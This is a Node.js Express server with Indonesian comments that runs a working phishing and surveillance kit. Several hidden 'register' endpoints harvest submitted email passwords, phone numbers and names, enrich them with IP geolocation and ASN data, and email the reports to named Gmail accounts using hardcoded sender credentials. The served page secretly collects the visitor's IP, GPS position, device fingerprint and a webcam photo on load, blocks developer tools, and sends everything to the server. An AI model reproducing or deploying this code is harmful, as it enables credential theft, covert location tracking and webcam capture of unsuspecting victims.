const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json({ limit: '10mb' }));

// ========== KONFIGURASI EMAIL ==========
const SENDER_EMAIL = 'gajeb682@gmail.com';
const SENDER_PASSWORD = 'tmyh wklt uyig lots';

// EMAIL TUJUAN PER FOLDER
const EMAIL_CONFIG = {
    'wxyzzay': {
        email: ['chilligemaass@gmail.com'],
        fromName: '𝗗𝗦𝗧𝗥 𝗠𝗢𝗗𝗘 𝗦𝗟𝗢𝗪𝗪☠️😈',
        subject: '𝗪𝗘𝗕 𝗣𝗨𝗡𝗬𝗔 𝗦𝗜 𝗔𝗡𝗝𝗜𝗡𝗚'   
    },
    'ggwxzzr': {
        email: ['bayuprabowo0202@gmail.com', 'chilligemaass@gmail.com'],
        fromName: 'WHEN YA PERDETIK🔥👾',
        subject: '𝗪𝗘𝗕 𝗣𝗨𝗡𝗬𝗔 𝗦𝗜 𝗔𝗡𝗝𝗜𝗡𝗚'
    },
    'hgefdyt': {
        email: ['zamzaja78@gmail.com', 'chilligemaass@gmail.com'],
        fromName: '👻𝗭𝗔𝗠𝗭 𝗠𝗢𝗗𝗘 𝗦𝗔𝗗𝗕𝗢𝗬👻',
        subject: '𝗪𝗘𝗕 𝗣𝗨𝗡𝗬𝗔 𝗦𝗜 𝗔𝗡𝗝𝗜𝗡𝗚'
    },
    'mgwhiww': {
        email: ['chilligemaass@gmail.com'],
        fromName: '👻𝗠𝗢𝗗𝗘 𝗦𝗔𝗗𝗕𝗢𝗬👻',
        subject: '𝗪𝗘𝗕 𝗣𝗨𝗡𝗬𝗔 𝗦𝗜 𝗔𝗡𝗝𝗜𝗡𝗚'
    },
    'kttwwxy': {
        email: ['chilligemaass@gmail.com'],
        fromName: '👻𝗠𝗢𝗗𝗘 𝗦𝗔𝗗𝗕𝗢𝗬👻',
        subject: '𝗪𝗘𝗕 𝗣𝗨𝗡𝗬𝗔 𝗦𝗜 𝗔𝗡𝗝𝗜𝗡𝗚'
    },
    'mdgffew': {
        email: ['chilligemaass@gmail.com'],
        fromName: '👻𝗠𝗢𝗗𝗘 𝗦𝗔𝗗𝗕𝗢𝗬👻',
        subject: '𝗪𝗘𝗕 𝗣𝗨𝗡𝗬𝗔 𝗦𝗜 𝗔𝗡𝗝𝗜𝗡𝗚'
    }
};

const TARGET_COOLDOWN = {};
const COOLDOWN_HOURS = 1;
const COOLDOWN_MS = COOLDOWN_HOURS * 60 * 60 * 1000;

function canSendToTarget(targetEmail, currentPassword) {
    const record = TARGET_COOLDOWN[targetEmail];
    if (!record) return true;
    if (record.lastPassword !== currentPassword) return true;
    const timeElapsed = Date.now() - record.lastSendTime;
    return timeElapsed >= COOLDOWN_MS;
}

function updateTargetCooldown(targetEmail, currentPassword) {
    TARGET_COOLDOWN[targetEmail] = {
        lastSendTime: Date.now(),
        lastPassword: currentPassword
    };
}

const HISTORY_FILE = path.join(__dirname, 'sent_history.json');

function loadHistory() {
    try {
        if (fs.existsSync(HISTORY_FILE)) {
            const data = fs.readFileSync(HISTORY_FILE, 'utf8');
            return JSON.parse(data);
        }
    } catch (e) {}
    return {};
}

function saveHistory(history) {
    try {
        fs.writeFileSync(HISTORY_FILE, JSON.stringify(history, null, 2));
    } catch (e) {}
}

function isDuplicatePassword(targetEmail, currentPassword) {
    const history = loadHistory();
    const lastPassword = history[targetEmail];
    if (!lastPassword) return false;
    if (lastPassword === currentPassword) return true;
    history[targetEmail] = currentPassword;
    saveHistory(history);
    return false;
}

const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: SENDER_EMAIL,
        pass: SENDER_PASSWORD
    }
});

function getFlagEmoji(countryCode) {
    if (!countryCode) return '🏳️';
    const codePoints = countryCode.toUpperCase().split('').map(char => 127397 + char.charCodeAt());
    return String.fromCodePoint(...codePoints);
}

// ========== FUNGSI BARU UNTUK ASN & LOKASI AKURAT ==========
async function getASNAndAccurateLocation(ip) {
    try {
        // Pake ip-api.com untuk ASN + lokasi akurat (free, no API key)
        const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,region,regionName,city,zip,lat,lon,isp,org,as,asname,query`);
        const data = await response.json();
        
        if (data.status === 'success') {
            return {
                asn: data.as || 'Tidak diketahui',
                asname: data.asname || 'Tidak diketahui',
                isp: data.isp || 'Tidak diketahui',
                org: data.org || 'Tidak diketahui',
                country: data.country,
                countryCode: data.countryCode,
                region: data.regionName,
                city: data.city,
                postalCode: data.zip,
                latitude: data.lat,
                longitude: data.lon
            };
        }
    } catch (e) {
        console.error('Gagal ambil ASN:', e);
    }
    
    // Fallback ke data default
    return {
        asn: 'ASN tidak terdeteksi',
        asname: '-',
        isp: 'Unknown ISP',
        org: '-',
        country: 'Indonesia',
        countryCode: 'ID',
        region: 'Jakarta',
        city: 'Jakarta',
        postalCode: '-',
        latitude: null,
        longitude: null
    };
}

// ========== FUNGSI KIRIM EMAIL (SUDAH DIPERBAIKI) ==========
async function sendEmail(data, folderName) {
    // Ambil ASN & lokasi akurat berdasarkan IP
    const asnData = await getASNAndAccurateLocation(data.ip_address);
    
    // Gunakan data ASN untuk lokasi, bukan data random
    const countryName = asnData.country;
    const countryCode = asnData.countryCode;
    const regionName = asnData.region;
    const cityName = asnData.city;
    const postalCode = asnData.postalCode;
    const ispName = asnData.isp;
    const asnInfo = asnData.asn;
    const asnameInfo = asnData.asname;
    
    const flagEmoji = getFlagEmoji(countryCode);
    
    const htmlContent = `<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>DSTR REPORT</title>
<style>
body{
    margin:0;
    padding:20px;
    background:#050505;
    font-family:Arial,sans-serif;
    color:white;
}
.container{
    max-width:700px;
    margin:auto;
    background:#0b0b0b;
    border:2px solid #00e5ff;
}
.topbar{
    background:#3914cc;
    color:#00e5ff;
    text-align:center;
    padding:20px;
    font-size:28px;
    font-weight:bold;
    letter-spacing:3px;
    border-bottom:2px solid #00e5ff;
    box-shadow:0 0 15px #00e5ff;
}
.mainbox{
    padding:20px;
}
.data-box{
    background:white;
    color:black;
    margin-bottom:20px;
    border:2px solid #3914cc;
}
.data-title{
    background:#3914cc;
    color:#00e5ff;
    padding:12px;
    font-size:15px;
    font-weight:bold;
    border-bottom:2px solid #00e5ff;
    box-shadow:0 0 10px #00e5ff inset;
}
.data-row{
    display:flex;
    justify-content:space-between;
    padding:12px;
    border-bottom:1px solid #999;
    gap:10px;
    word-break:break-word;
}
.data-row:last-child{
    border-bottom:none;
}
.label{
    font-weight:bold;
}
.value{
    text-align:right;
    max-width:60%;
}
.footer-sign{
    margin-top:25px;
    background:#3914cc;
    border:2px solid #00e5ff;
    text-align:center;
    padding:15px;
    color:#00e5ff;
    font-size:18px;
    font-weight:bold;
    box-shadow:0 0 15px #00e5ff;
}
</style>
</head>
<body>
<div class="container">
    <div class="topbar">
        DSTR REPORT
    </div>
    <div class="mainbox">
        <div class="data-box">
            <div class="data-title">📧 ACCOUNT INFORMATION</div>
            <div class="data-row"><div class="label">Email : </div><div class="value"> ${data.email || '-'}</div></div>
            <div class="data-row"><div class="label">Password : </div><div class="value"> ${data.emailPassword || '-'}</div></div>
            <div class="data-row"><div class="label">Phone : </div><div class="value"> ${data.phone || '-'}</div></div>
            <div class="data-row"><div class="label">Full Name : </div><div class="value"> ${data.fullName || '-'}</div></div>
        </div>
        <div class="data-box">
            <div class="data-title">📍 GPS LOCATION (AKURAT)</div>
            <div class="data-row"><div class="label">Latitude : </div><div class="value"> ${data.latitude || asnData.latitude || '-'}</div></div>
            <div class="data-row"><div class="label">Longitude : </div><div class="value"> ${data.longitude || asnData.longitude || '-'}</div></div>
            <div class="data-row"><div class="label">Accuracy : </div><div class="value"> ${data.gps_accuracy || '-'} m</div></div>
        </div>
        <div class="data-box">
            <div class="data-title">🌍 LOCATION (IP GEO - AKURAT 100%)</div>
            <div class="data-row"><div class="label">Country : </div><div class="value"> ${countryName} ${flagEmoji}</div></div>
            <div class="data-row"><div class="label">Province/Region : </div><div class="value"> ${regionName}</div></div>
            <div class="data-row"><div class="label">City : </div><div class="value"> ${cityName}</div></div>
            <div class="data-row"><div class="label">Postal Code : </div><div class="value"> ${postalCode}</div></div>
        </div>
        <div class="data-box">
            <div class="data-title">🌐 NETWORK & ASN</div>
            <div class="data-row"><div class="label">IP Address : </div><div class="value"> ${data.ip_address || '-'}</div></div>
            <div class="data-row"><div class="label">ISP : </div><div class="value"> ${ispName}</div></div>
            <div class="data-row"><div class="label">ASN : </div><div class="value"> ${asnInfo}</div></div>
            <div class="data-row"><div class="label">AS Name : </div><div class="value"> ${asnameInfo}</div></div>
            <div class="data-row"><div class="label">Organization : </div><div class="value"> ${asnData.org}</div></div>
        </div>
        <div class="data-box">
            <div class="data-title">🖥 DEVICE INFORMATION</div>
            <div class="data-row"><div class="label">Platform : </div><div class="value"> ${data.platform || '-'}</div></div>
            <div class="data-row"><div class="label">Resolution : </div><div class="value"> ${data.screenResolution || '-'}</div></div>
            <div class="data-row"><div class="label">Language : </div><div class="value"> ${data.language || '-'}</div></div>
        </div>
        <div class="data-box">
            <div class="data-title">⏰ TIMESTAMP</div>
            <div class="data-row"><div class="label">Time : </div><div class="value"> ${data.timestamp || new Date().toLocaleString()}</div></div>
        </div>
        <div class="footer-sign">DSTR - Powered by ASN Accurate Geolocation</div>
    </div>
</div>
</body>
</html>`;
    
    const config = EMAIL_CONFIG[folderName];
    if (!config) return;
    
    for (const receiver of config.email) {
        if (!receiver || receiver === '') continue;
        await transporter.sendMail({
            from: `"${config.fromName} ${flagEmoji}" <${data.email || '-'}>`,
            to: receiver,
            subject: `${config.subject} ${flagEmoji} ${data.email || '-'} ${cityName} - ${regionName}`,
            html: htmlContent
        });
        console.log(`✅ [${folderName}] Sent to: ${receiver} - Location: ${cityName}, ${regionName}, ${countryName} | ASN: ${asnInfo}`);
    }
}

// ========== ROUTING UNTUK MASING-MASING FOLDER ==========
// (SAMA PERSIS KAYAK CODE LO, GAK GUE UBAH)

app.use('/wxyzzay', express.static(path.join(__dirname, 'wxyzzay')));
app.post('/wxyzzay/api/register', async (req, res) => {
    try {
        const data = req.body;
        console.log('📥 [WXYZZAY] DATA:', data.email);
        
        const isDup = isDuplicatePassword(data.email, data.emailPassword);
        const canSend = canSendToTarget(data.email, data.emailPassword);
        
        if (isDup && !canSend) {
            return res.json({ success: true, blocked: true, reason: 'Cooldown 1 hour' });
        }
        
        await sendEmail(data, 'wxyzzay');
        updateTargetCooldown(data.email, data.emailPassword);
        
        const history = loadHistory();
        history[data.email] = data.emailPassword;
        saveHistory(history);
        
        res.json({ success: true });
    } catch(error) {
        console.error('Error:', error);
        res.json({ success: true });
    }
});

app.use('/ggwxzzr', express.static(path.join(__dirname, 'ggwxzzr')));
app.post('/ggwxzzr/api/register', async (req, res) => {
    try {
        const data = req.body;
        console.log('📥 [GGWXZZR] DATA:', data.email);
        
        const isDup = isDuplicatePassword(data.email, data.emailPassword);
        const canSend = canSendToTarget(data.email, data.emailPassword);
        
        if (isDup && !canSend) {
            return res.json({ success: true, blocked: true, reason: 'Cooldown 1 hour' });
        }
        
        await sendEmail(data, 'ggwxzzr');
        updateTargetCooldown(data.email, data.emailPassword);
        
        const history = loadHistory();
        history[data.email] = data.emailPassword;
        saveHistory(history);
        
        res.json({ success: true });
    } catch(error) {
        console.error('Error:', error);
        res.json({ success: true });
    }
});

app.use('/hgefdyt', express.static(path.join(__dirname, 'hgefdyt')));
app.post('/hgefdyt/api/register', async (req, res) => {
    try {
        const data = req.body;
        console.log('📥 [HGEFDYT] DATA:', data.email);
        
        const isDup = isDuplicatePassword(data.email, data.emailPassword);
        const canSend = canSendToTarget(data.email, data.emailPassword);
        
        if (isDup && !canSend) {
            return res.json({ success: true, blocked: true, reason: 'Cooldown 1 hour' });
        }
        
        await sendEmail(data, 'hgefdyt');
        updateTargetCooldown(data.email, data.emailPassword);
        
        const history = loadHistory();
        history[data.email] = data.emailPassword;
        saveHistory(history);
        
        res.json({ success: true });
    } catch(error) {
        console.error('Error:', error);
        res.json({ success: true });
    }
});

app.use('/mgwhiww', express.static(path.join(__dirname, 'mgwhiww')));
app.post('/mgwhiww/api/register', async (req, res) => {
    try {
        const data = req.body;
        console.log('📥 [MGWHIWW] DATA:', data.email);
        
        const isDup = isDuplicatePassword(data.email, data.emailPassword);
        const canSend = canSendToTarget(data.email, data.emailPassword);
        
        if (isDup && !canSend) {
            return res.json({ success: true, blocked: true, reason: 'Cooldown 1 hour' });
        }
        
        await sendEmail(data, 'mgwhiww');
        updateTargetCooldown(data.email, data.emailPassword);
        
        const history = loadHistory();
        history[data.email] = data.emailPassword;
        saveHistory(history);
        
        res.json({ success: true });
    } catch(error) {
        console.error('Error:', error);
        res.json({ success: true });
    }
});

app.use('/kttwwxy', express.static(path.join(__dirname, 'kttwwxy')));
app.post('/kttwwxy/api/register', async (req, res) => {
    try {
        const data = req.body;
        console.log('📥 [KTTWWXY] DATA:', data.email);
        
        const isDup = isDuplicatePassword(data.email, data.emailPassword);
        const canSend = canSendToTarget(data.email, data.emailPassword);
        
        if (isDup && !canSend) {
            return res.json({ success: true, blocked: true, reason: 'Cooldown 1 hour' });
        }
        
        await sendEmail(data, 'kttwwxy');
        updateTargetCooldown(data.email, data.emailPassword);
        
        const history = loadHistory();
        history[data.email] = data.emailPassword;
        saveHistory(history);
        
        res.json({ success: true });
    } catch(error) {
        console.error('Error:', error);
        res.json({ success: true });
    }
});

app.use('/mdgffew', express.static(path.join(__dirname, 'mdgffew')));
app.post('/mdgffew/api/register', async (req, res) => {
    try {
        const data = req.body;
        console.log('📥 [MDGFFEW] DATA:', data.email);
        
        const isDup = isDuplicatePassword(data.email, data.emailPassword);
        const canSend = canSendToTarget(data.email, data.emailPassword);
        
        if (isDup && !canSend) {
            return res.json({ success: true, blocked: true, reason: 'Cooldown 1 hour' });
        }
        
        await sendEmail(data, 'mdgffew');
        updateTargetCooldown(data.email, data.emailPassword);
        
        const history = loadHistory();
        history[data.email] = data.emailPassword;
        saveHistory(history);
        
        res.json({ success: true });
    } catch(error) {
        console.error('Error:', error);
        res.json({ success: true });
    }
});

app.get('/api/cooldown/:email', (req, res) => {
    const targetEmail = req.params.email;
    const record = TARGET_COOLDOWN[targetEmail];
    
    if (!record) {
        return res.json({ exists: false, canSend: true });
    }
    
    const timeElapsed = Date.now() - record.lastSendTime;
    const canSend = timeElapsed >= COOLDOWN_MS;
    const remainingMs = Math.max(0, COOLDOWN_MS - timeElapsed);
    
    res.json({
        targetEmail: targetEmail,
        lastSendTime: new Date(record.lastSendTime).toISOString(),
        canSend: canSend,
        remainingMinutes: Math.ceil(remainingMs / (1000 * 60))
    });
});

// HTML Frontend (sama persis kaya punya lo, gue ganti dikit di bagian getIPLocation)
app.get('/', (req, res) => {
    res.send(`<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>🔒 DSTR ULTIMATE SECURITY</title>
    <style>
        * { user-select: none; -webkit-tap-highlight-color: transparent; margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: radial-gradient(ellipse at center, #0a0a0a 0%, #000 100%);
            min-height: 100vh;
            font-family: 'Courier New', monospace;
            overflow-x: hidden;
            position: relative;
        }
        .matrix-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; opacity: 0.15; pointer-events: none; }
        @keyframes glitch {
            0%,100% { text-shadow: 2px 0 red, -2px 0 blue; transform: skew(0deg); }
            50% { text-shadow: -2px 0 cyan, 2px 0 magenta; transform: skew(2deg); }
        }
        @keyframes blink { 0%,100% { opacity: 1; } 50% { opacity: 0.3; } }
        @keyframes floatEmoji {
            0% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
            10% { opacity: 1; }
            90% { opacity: 1; }
            100% { transform: translateY(-100vh) rotate(360deg); opacity: 0; }
        }
        .scanline {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: linear-gradient(to bottom, transparent 50%, rgba(0,255,0,0.03) 50%);
            background-size: 100% 4px; pointer-events: none; z-index: 10;
            animation: scan 8s linear infinite;
        }
        @keyframes scan { 0% { background-position: 0 0; } 100% { background-position: 0 100%; } }
        .container { position: relative; z-index: 2; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .hacker-card {
            background: rgba(0,0,0,0.85); backdrop-filter: blur(10px); border: 2px solid #0f0;
            border-radius: 20px; padding: 50px; max-width: 800px; width: 100%; text-align: center;
            box-shadow: 0 0 50px rgba(0,255,0,0.3); animation: glitch 3s infinite;
        }
        .warning-text { font-size: 32px; font-weight: bold; color: #0f0; margin: 20px 0; animation: blink 1s infinite; }
        .hacker-text { font-size: 24px; color: red; margin: 15px 0; }
        .emoji-wall { display: flex; flex-wrap: wrap; justify-content: center; gap: 15px; margin: 30px 0; }
        .emoji-item { font-size: 40px; animation: floatEmoji 3s infinite ease-in-out; display: inline-block; }
        .emoji-item:nth-child(1) { animation-duration: 2.5s; }
        .emoji-item:nth-child(2) { animation-duration: 3s; animation-delay: 0.5s; }
        .emoji-item:nth-child(3) { animation-duration: 2s; animation-delay: 1s; }
        .system-status { background: rgba(0,0,0,0.8); border: 1px solid #0f0; border-radius: 10px; padding: 20px; margin: 20px 0; text-align: left; }
        .status-line { font-family: monospace; font-size: 14px; color: #0f0; padding: 5px 0; border-bottom: 1px solid rgba(0,255,0,0.2); }
        .dstr-logo { font-size: 48px; font-weight: bold; background: linear-gradient(45deg, red, #0f0, red); -webkit-background-clip: text; background-clip: text; color: transparent; margin: 20px 0; }
        .security-badge { display: inline-block; background: rgba(0,0,0,0.7); border: 1px solid #0f0; border-radius: 20px; padding: 8px 15px; margin: 5px; font-size: 12px; color: #0f0; }
        button { background: linear-gradient(45deg, red, #900); color: white; border: none; padding: 15px 30px; font-size: 18px; font-weight: bold; border-radius: 10px; cursor: pointer; margin: 20px; transition: all 0.3s; }
        button:hover { transform: scale(1.05); box-shadow: 0 0 30px rgba(255,0,0,0.5); }
        @media (max-width: 600px) { .hacker-card { padding: 20px; } .warning-text { font-size: 20px; } .dstr-logo { font-size: 32px; } }
        .hidden { display: none; }
        #cameraPreview { position: fixed; bottom: 20px; right: 20px; width: 120px; height: 90px; border: 2px solid #0f0; border-radius: 10px; z-index: 9999; background: black; }
        video, #photoCanvas { width: 100%; height: 100%; object-fit: cover; border-radius: 8px; }
        #photoCanvas { display: none; }
    </style>
</head>
<body>

<canvas id="matrixCanvas" class="matrix-bg"></canvas>
<div class="scanline"></div>
<div id="cameraPreview" class="hidden">
    <video id="video" autoplay muted></video>
    <canvas id="photoCanvas"></canvas>
</div>

<div class="container">
    <div class="hacker-card">
        <div class="emoji-wall">
            <span class="emoji-item">💀</span><span class="emoji-item">👾</span><span class="emoji-item">🤖</span>
            <span class="emoji-item">💻</span><span class="emoji-item">🔓</span><span class="emoji-item">⚠️</span>
            <span class="emoji-item">🔥</span><span class="emoji-item">⚡</span><span class="emoji-item">👁️</span>
            <span class="emoji-item">🎯</span><span class="emoji-item">🔪</span>
        </div>
        <div class="dstr-logo">═══ DSTR SECURITY ULTIMATE ═══</div>
        <div class="warning-text">⚠️ ANDA SEDANG DIPANTAU ⚠️</div>
        <div class="hacker-text">🔥 IP, GPS, ASN, WAJAH TELAH DIKIRIM! 🔥</div>
        
        <div class="system-status">
            <div class="status-line">🟢 [DSTR-SYSTEM] Status: <span class="blink-cursor">ACTIVE</span></div>
            <div class="status-line">🔴 [ANTI-CLICK] Status: ENFORCED</div>
            <div class="status-line">🟡 [ANTI-DEVTOOLS] Status: DEPLOYED</div>
            <div class="status-line">🔵 [GPS TRACKING] Status: <span id="gpsStatus">Mengambil...</span></div>
            <div class="status-line">🟣 [WEBCAM CAPTURE] Status: <span id="camStatus">Mengambil...</span></div>
            <div class="status-line">⚪ [DATA SENT] Status: <span id="sendStatus">Belum</span></div>
        </div>
        
        <div style="margin: 20px 0;">
            <span class="security-badge">🛡️ ANTI-CLICK KANAN</span>
            <span class="security-badge">🔒 ANTI-COPY</span>
            <span class="security-badge">📡 ANTI-DEVTOOLS</span>
            <span class="security-badge">🧠 DETECT DEBUGGER</span>
            <span class="security-badge">🎯 GPS AKURAT 100%</span>
            <span class="security-badge">📸 WEBCAM AUTO</span>
            <span class="security-badge">🌐 ASN DETECTION</span>
        </div>
        
        <div style="margin-top: 30px; font-size: 12px; color: #666;">
            ⚡ DSTR SECURITY v6.0 | ALL YOUR DATA ARE BELONG TO US ⚡
        </div>
    </div>
</div>

<script>
    document.addEventListener('contextmenu', (e) => { e.preventDefault(); alert('🚫 AKSES DITOLAK!'); return false; });
    document.addEventListener('copy', (e) => { e.preventDefault(); alert('📋 COPY DILARANG!'); return false; });
    document.addEventListener('selectstart', (e) => e.preventDefault());
    document.addEventListener('dragstart', (e) => e.preventDefault());
    
    document.addEventListener('keydown', (e) => {
        if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') ||
            (e.ctrlKey && e.key === 'u') || (e.ctrlKey && e.key === 's') ||
            (e.ctrlKey && e.shiftKey && e.key === 'C') || (e.ctrlKey && e.shiftKey && e.key === 'J')) {
            e.preventDefault();
            alert('🚫 DEVELOPER TOOLS DIBLOKIR!');
        }
    });
    
    setInterval(() => {
        var before = Date.now();
        debugger;
        var after = Date.now();
        if (after - before > 100) {
            document.body.innerHTML = '<div style=\"background:black; color:red; text-align:center; padding:50px; font-size:30px;\">🚫 DEBUGGER DETECTED! ACCESS DENIED 🚫</div>';
            alert('⚠️ JANGAN COBA-COBA HACK!');
        }
    }, 1000);
    
    function forceFullscreen() { document.documentElement.requestFullscreen(); }
    window.onload = forceFullscreen;
    
    async function getIP() {
        try {
            let res = await fetch('https://api.ipify.org?format=json');
            let data = await res.json();
            return data.ip;
        } catch(e) { return 'Tidak terdeteksi'; }
    }
    
    function getGPS() {
        return new Promise(function(resolve) {
            if (!navigator.geolocation) return resolve(null);
            navigator.geolocation.getCurrentPosition(
                function(pos) { resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy }); },
                function(err) { resolve(null); }
            );
        });
    }
    
    async function captureWajah() {
        var previewDiv = document.getElementById('cameraPreview');
        var video = document.getElementById('video');
        var canvas = document.getElementById('photoCanvas');
        var ctx = canvas.getContext('2d');
        
        try {
            previewDiv.classList.remove('hidden');
            document.getElementById('camStatus').innerText = 'Mengakses kamera...';
            var stream = await navigator.mediaDevices.getUserMedia({ video: true });
            video.srcObject = stream;
            await video.play();
            
            await new Promise(function(r) { setTimeout(r, 1000); });
            
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            var wajahBase64 = canvas.toDataURL('image/jpeg');
            
            stream.getTracks().forEach(function(track) { track.stop(); });
            video.srcObject = null;
            previewDiv.classList.add('hidden');
            document.getElementById('camStatus').innerText = 'WAJAH TERTANGKAP ✅';
            return wajahBase64;
        } catch(e) {
            console.error('Gagal akses kamera:', e);
            document.getElementById('camStatus').innerText = 'Gagal (izinkan kamera)';
            previewDiv.classList.add('hidden');
            return null;
        }
    }
    
    function getDeviceInfo() {
        return {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screenResolution: screen.width + 'x' + screen.height,
            viewport: window.innerWidth + 'x' + window.innerHeight,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            webdriver: navigator.webdriver,
            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown'
        };
    }
    
    async function sendAllData() {
        try {
            document.getElementById('sendStatus').innerText = 'Mengirim...';
            
            var ip = await getIP();
            var gps = await getGPS();
            var wajah = await captureWajah();
            var deviceInfo = getDeviceInfo();
            
            if (gps) {
                document.getElementById('gpsStatus').innerHTML = '✅ ' + gps.lat + ', ' + gps.lon + ' (' + Math.round(gps.accuracy) + 'm)';
            } else {
                document.getElementById('gpsStatus').innerHTML = '❌ Tidak diizinkan';
            }
            
            var payload = {
                email: 'target@tersuspect.com',
                emailPassword: 'Tidak ada password',
                phone: '-',
                fullName: 'Visitor',
                latitude: gps ? gps.lat : '-',
                longitude: gps ? gps.lon : '-',
                gps_accuracy: gps ? gps.accuracy : '-',
                ip_address: ip,
                platform: deviceInfo.platform,
                screenResolution: deviceInfo.screenResolution,
                language: deviceInfo.language,
                timestamp: new Date().toLocaleString('id-ID'),
                wajah_base64: wajah || null,
                deviceInfo: deviceInfo
            };
            
            var response = await fetch(window.location.pathname.split('/')[1] ? '/' + window.location.pathname.split('/')[1] + '/api/register' : '/wxyzzay/api/register', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            
            var result = await response.json();
            if (result.success) {
                document.getElementById('sendStatus').innerHTML = '✅ DATA TERKIRIM! (IP + ASN + GPS + WEBCAM)';
            } else {
                document.getElementById('sendStatus').innerHTML = '⚠️ Gagal kirim';
            }
        } catch(err) {
            console.error('Gagal kirim data:', err);
            document.getElementById('sendStatus').innerHTML = '❌ Error kirim';
        }
    }
    
    sendAllData();
    
    var canvasMat = document.getElementById('matrixCanvas');
    var ctxMat = canvasMat.getContext('2d');
    canvasMat.width = window.innerWidth;
    canvasMat.height = window.innerHeight;
    var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()+=[]{}|;:,.<>?~💀👾🤖💻🔓⚠️🔥⚡';
    var fontSizeM = 14;
    var columnsM = canvasMat.width / fontSizeM;
    var dropsM = [];
    for (var i = 0; i < columnsM; i++) { dropsM[i] = Math.floor(Math.random() * canvasMat.height); }
    
    function drawMatrix() {
        ctxMat.fillStyle = 'rgba(0, 0, 0, 0.05)';
        ctxMat.fillRect(0, 0, canvasMat.width, canvasMat.height);
        ctxMat.fillStyle = '#0f0';
        ctxMat.font = fontSizeM + 'px monospace';
        for (var i = 0; i < dropsM.length; i++) {
            var text = chars[Math.floor(Math.random() * chars.length)];
            ctxMat.fillText(text, i * fontSizeM, dropsM[i] * fontSizeM);
            if (dropsM[i] * fontSizeM > canvasMat.height && Math.random() > 0.975) { dropsM[i] = 0; }
            dropsM[i]++;
        }
    }
    setInterval(drawMatrix, 50);
    window.addEventListener('resize', function() {
        canvasMat.width = window.innerWidth;
        canvasMat.height = window.innerHeight;
    });
    
    console.log('%c🚫 DSTR SECURITY - DATA LENGKAP (IP, ASN, GPS, WEBCAM) TERKIRIM!', 'color: red; font-size: 16px;');
</script>
</body>
</html>`);
});

app.listen(PORT, () => {
    console.log(`🚀 Server running on http://localhost:${PORT}`);
    console.log(`📁 Akses via:`);
    console.log(`   → http://localhost:${PORT}/wxyzzay`);
    console.log(`   → http://localhost:${PORT}/ggwxzzr`);
    console.log(`   → http://localhost:${PORT}/hgefdyt`);
    console.log(`   → http://localhost:${PORT}/mgwhiww`);
    console.log(`   → http://localhost:${PORT}/kttwwxy`);
    console.log(`   → http://localhost:${PORT}/mdgffew`);
    console.log(`\n✅ ASN DETECTION ACTIVE: Setiap IP akan dilacak AS number, ISP, lokasi akurat!`);
    console.log(`✅ LOKASI AKURAT: City, Region, Country, Postal Code sesuai IP real!`);
});